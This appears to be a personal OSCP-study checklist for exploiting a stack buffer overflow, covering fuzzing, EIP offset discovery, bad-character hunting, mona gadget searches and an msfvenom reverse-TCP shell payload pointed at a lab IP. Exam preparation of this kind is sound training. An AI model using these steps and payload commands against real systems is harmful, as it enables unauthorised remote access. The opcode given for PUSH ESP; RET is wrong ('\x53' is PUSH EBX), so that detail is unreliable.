# Buffer Overflow

## General Flow
Using the `bof-complete.py` script. This is used as a general reference flow as part of my OSCP prep. 

### Part 1

1. Create a fuzzing script and start with a buffer size of 100 
2. Keep increasing the buffer until the application crashes

### Part 2 - Control the EIP
1. `msf-pattern_create -l 300` (Change this size to whatever the buffer was on crash)
2. Save pattern in "buff" variable and re-run
3. In Immunity Debugger, see what value was writted in EIP

### Part 3 - Set the offset

1. Find the offset: `msf-pattern_offset -l 300 -q 316A4130` (Example: 272)
2. Shorten the buffer, make EIP = "B", and make an offset ("C") 
3. Run again with new script and make sure EIP is writted as B (42424242)

### Part 4 - Expand the Stack (Make room for shellcode)

1. Make new variable equal to "D" and increase overall size - may need to adjust until app doesn't crash

Note: Need about 100-200 bytes for most stable tcp reverse shells

### Part 5 - Find the Bad Characters

1. Create a new variable with all the possible characters in hex
2. Follow dump of ESP to identify all bad characters (Right-click ESP, follow in dump)
3. Re-run as many times as needed, taking note of all bad characters

Optional: use `mona.py` script to hunt bad chars

### Part 6 - Jumping to the Stack & Creating Shellcode

1. First, Find a way to jump (One of these options):
	1. First try to JMP ESP: `!mona find -s "\xff\xe4" -m "dawn.exe"` 
	2. Second, try PUSH ESP; RET: `!mona find -s "\x53\xc3" -m "dawn.exe"`
	3. Third, try CALL ESP: `!mona find -s ""\xff\xd4" -m "dawn.exe"`
	4. Note: Make sure none of these addresses have a bad char!
	5. NOTE: REVERSE THE ORDER OF THE BYTES!
	6. Change code to match returned EIP address 

**FOR THE LOVE OF GOD, DON'T FORGET TO REVERSE THE ORDER! Endianness and all that...**

2. Generate shell code: 
	1. `msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.49.229 lport=80 -f python -b '\x00'`
	2. Include all bad characters after `-b` 
3. Add shellcode and create NOP Slide 
4. One last test to make sure it works (Don't forget to start the listener!)
5. Exploit!
